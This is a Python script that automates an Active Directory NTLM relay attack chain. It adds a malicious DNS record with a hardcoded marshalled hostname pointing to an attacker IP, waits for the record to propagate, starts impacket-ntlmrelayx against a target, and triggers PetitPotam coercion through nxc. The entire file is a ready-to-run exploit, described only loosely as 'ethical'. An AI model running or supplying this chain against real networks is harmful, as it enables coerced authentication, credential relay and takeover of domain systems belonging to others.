#!/usr/bin/env python3
import shlex
import sys
import argparse
import subprocess
import time

STATIC_DNS_RECORD = "localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"

def run_dnstool(user, password, attacker_ip, dns_ip, dc_fqdn):
    print("[*] Adding malicious DNS record using dnstool.py...")
    dnstool_cmd = [
        "python3", "dnstool.py",
        "-u", user,
        "-p", password,
        "-a", "add",
        "-r", STATIC_DNS_RECORD,
        "-d", attacker_ip,
        "-dns-ip", dns_ip,
        dc_fqdn
    ]
    subprocess.run(dnstool_cmd, check=True)
    print("[+] DNS record added.")

def wait_for_dns_record(record, dns_ip, timeout=60):
    timeout = int(timeout)
    print(f"[*] Waiting for DNS record {record} to propagate...")
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            result = subprocess.run(
                ["dig", "+short", record, f"@{dns_ip}"],
                capture_output=True, text=True
            )
            if result.stdout.strip():
                print("[+] DNS record is live.")
                return True
        except Exception as e:
            print(f"[!] Error checking DNS record: {e}")
        time.sleep(2)
    print("[!] Timeout reached. DNS record not found.")
    return False

def start_ntlmrelayx(target):
    print("[*] Starting ntlmrelayx listener in a new xterm...")
    cmd = ["xterm", "-hold", "-e", "impacket-ntlmrelayx", "-t", target, "-smb2support"]
    return subprocess.Popen(cmd)

def run_petitpotam(target_ip, domain, user, password):
    print("[*] Triggering PetitPotam coercion via nxc in a new xterm...")

    # Build the shell command as one string
    command_str = (
        f"nxc smb {target_ip} "
        f"-d {domain} "
        f"-u {user} "
        f"-p '{password}' "
        f"-M coerce_plus "
        f"-o M=PetitPotam L=\"localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA\""
    )

#   print("[DEBUG] Executing command in xterm:", command_str)

    subprocess.Popen(["xterm", "-e", "bash", "-c", command_str])

def main():
    parser = argparse.ArgumentParser(description="Ethical attack chain: dnstool + ntlmrelayx + PetitPotam")
    parser.add_argument("-u", "--username", required=True, help="Username (DOMAIN\\user)")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-d", "--attacker-ip", required=True, help="Attacker IP (Linux/Kali machine)")
    parser.add_argument("--dns-ip", required=True, help="IP of Domain Controller (DNS)")
    parser.add_argument("--dc-fqdn", required=True, help="FQDN of the Domain Controller")
    parser.add_argument("--target", required=True, help="Target machine for NTLM relay (FQDN)")
    parser.add_argument("--target-ip", required=True, help="IP of the coercion target (for nxc)")
    args = parser.parse_args()

    # Step 1: Add DNS record (static record inside)
    run_dnstool(args.username, args.password, args.attacker_ip, args.dns_ip, args.dc_fqdn)

    # Step 2: Check if DNS record was added succesfully
    domain_name = ".".join(args.dc_fqdn.split(".")[1:])
    full_record = f"{STATIC_DNS_RECORD}.{domain_name}"
    if not wait_for_dns_record(full_record, args.dns_ip, timeout=60):
        print("[!] Exiting due to DNS record not being live.")
        sys.exit(1)
    # Step 3: Start ntlmrelayx listener in new terminal
    ntlmrelay_proc = start_ntlmrelayx(args.target)
    time.sleep(5)  # Give ntlmrelayx some time to start

    # Step 4: Trigger PetitPotam coercion in a separate terminal
    domain, user = args.username.split("\\", 1)
    run_petitpotam(args.target_ip, domain, user, args.password)

    print("[*] Exploit chain triggered. Check both terminals for output.")
    input("[*] Press Enter to stop ntlmrelayx listener...")
    ntlmrelay_proc.terminate()
    ntlmrelay_proc.wait()

if __name__ == "__main__":
    main()
